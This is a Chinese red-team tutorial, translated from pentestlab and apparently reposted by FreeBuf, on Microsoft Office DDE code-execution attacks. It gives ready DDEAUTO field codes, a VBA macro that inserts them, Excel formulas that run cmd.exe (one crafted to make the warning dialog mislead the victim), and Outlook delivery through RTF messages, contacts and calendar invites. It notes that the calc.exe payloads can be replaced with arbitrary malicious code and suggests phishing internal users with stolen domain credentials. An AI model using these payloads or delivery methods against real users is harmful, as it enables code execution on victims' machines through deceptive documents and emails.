**Microsoft
Office可以说是使用最广泛的办公软件。然而就是因为这样，也使它成为了黑客的主要攻击目标之一，例如在网络安全对抗赛中红队会用它来窃取域哈希，甚至执行任意代码。**

从以往的攻击手法上看，在Microsoft
Office中执行任意代码往往是通过宏来实现的。那么，有没有其它方法可以实现任意代码执行呢？答案是肯定的。[SensePost](https://twitter.com/sensepost)就发现了一种利用DDE（动态数据交换）协议，来执行任意代码的方法。办公产品内有许多可通过DDE接收代码并执行的地方，本文我将为大家演示一些这类攻击的常用手法。此外，关于本文的payload可以结合[DDE
Payloads](https://medium.com/red-team/dde-payloads-16629f4a2fcd)作为参考。

## Word

在Microsoft
Word中，最简单的方法是插入一个字段代码，如[SensePost](https://twitter.com/sensepost)[文](https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/)中所述，并在formula中嵌入payload。

    
    
    Insert-> Quick Parts-> Field

![1word-dde-via-field-code.png](https://image.3001.net/images/20180119/15163242927467.png!small)  

在括号内添加以下payload内容，将会在下次打开文件时弹出一个对话框。如果用户选择“Yes”选项，则payload将被执行。

    
    
    {DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe"}

![2word-dde-payload.png](https://image.3001.net/images/20180119/15163243095904.png!small)  

或者，我们也可以像[Paul
Ritchie](https://twitter.com/cornerpirate)在其[博客](https://www.secarma.co.uk/labs/is-dynamic-data-exchange-dde-injection-a-thing/)中描述的那样，使用宏将payload插入字段代码。

    
    
    ''' Programmatically inserts a new field code into a word document at the current selection index.
    ''' This is of type "wdFieldDDEAuto" which is a field code which executes Dynamic Data Exchange (DDE)
    ''' When the document is opened. This includes an example PoC which launches calc.exe
    Public Sub FieldCodeFun()
    ' Payload String
    Dim payload As String
    payload = """c:\\windows\\system32\\calc.exe"" ""/c calc.exe"""
    ' Insert our payload as a field code
    Selection.Collapse Direction:=wdCollapseEnd
    ActiveDocument.Fields.Add Range:=Selection.Range, _
    Type:=wdFieldDDEAuto, Text:=payload
    End Sub

![3word-dde-via-macro.png](https://image.3001.net/images/20180119/15163243363798.png!small)  

以上示例中的payload只是打开了计算器，但我们也可以将其修改为其它任意代码（甚至恶意的）。

[Mike
Czumaky](https://twitter.com/securitysift)在他的博客中也为我们提供了一种很好的思路，从外部托管的另一个Word文档加载恶意的DDE。
INCLUDE字段代码可被用来与该攻击向量结合外部URL使用。

## ![4word-load-dde-payload-from-another-document.png](https://image.3001.net/images/20180119/1516324357543.png!small)  

## Excel

在Microsoft Excel
DDE有效载荷可以通过formula的使用来利用。以下两个formula将执行代码（本例中为计算器），第二个formula将使警告消息框看上去更合理，以更好的欺骗用户。

    
    
    =cmd|'/c calc.exe'!A1
    =MSEXCEL|'\..\..\..\Windows\System32\cmd.exe /c calc.exe'!''

![5excel-dde-command.png](https://image.3001.net/images/20180119/15163243851600.png!small)  

当用户打开恶意Excel电子表格时，将出现以下对话框。

![6excel-dde-dialog-box.png](https://image.3001.net/images/20180119/15163244041754.png!small)  

第二个formula仍将执行代码，但对话框中的消息内容将被修改，此时我们可以看到不再是要求用户启动CMD.EXE，而是要求启动MSEXCEL.exe。

## ![7excel-dde-2nd-command.png](https://image.3001.net/images/20180119/15163244244611.png!small)  

## Outlook

在Outlook中也有许多可执行DDE
payload的地方。例如，你已经获取到了域凭据，则可以更好的伪装电子邮件发送给其他用户，以获取更多内部的shell。

### Message

发送包含DDE的Outlook消息也可以自动执行代码。这同样适用于以附件形式发送的电子邮件。

![8outlook-message-dde-payload.png](https://image.3001.net/images/20180119/15163244485220.png!small)  

但需要注意的是，因为某些电子邮件服务器会将所有电子邮件转换为HTML，为了避免我们的DDE payload失效，我们需要将电子邮件以RTF格式发送。

![9outlook-message-dde-in-rich-text.png](https://image.3001.net/images/20180119/151632447039.png!small)  

当用户打开我们发送的邮件后，DDE payload将会被执行。

![10outlook-message-rtf-email-message.png](https://image.3001.net/images/20180119/15163244946029.png!small)  

### Contact

创建新的联系人或修改现有的联系人，并将DDE payload放入Notes区域可导致执行代码。

![11outlook-dde-payload-in-contact-notes.png](https://image.3001.net/images/20180119/15163245143046.png!small)  

联系人需要发送给目标用户。

![12outlook-foward-contact-with-dde.png](https://image.3001.net/images/20180119/15163245364992.png!small)  

当用户打开联系人时，将执行嵌入的DDE payload。

![13outlook-dde-execution.png](https://image.3001.net/images/20180119/15163245753324.png!small)  

### Calendar Invite

同样，该方法也适用与calendar invitation功能。例如，发送一个添加了DDE
paylaod的会议邀请，一旦目标用户与其进行了交互（打开或取消），则DDE paylaod就将被执行。

![14outlook-dde-via-calendar-invitations.png](https://image.3001.net/images/20180119/15163246021403.png!small)  

### 参考

<https://medium.com/red-team/dde-payloads-16629f4a2fcd>

<http://staaldraad.github.io/2017/10/23/msword-field-codes/>

<http://willgenovese.com/office-ddeauto-attacks/>

<https://www.secarma.co.uk/labs/is-dynamic-data-exchange-dde-injection-a-thing/>

 ***参考来源：[pentestlab](https://pentestlab.blog/2018/01/16/microsoft-office-dde-attacks/)，FB小编 secist 编译，转载请注明来自FreeBuf.COM**  
s

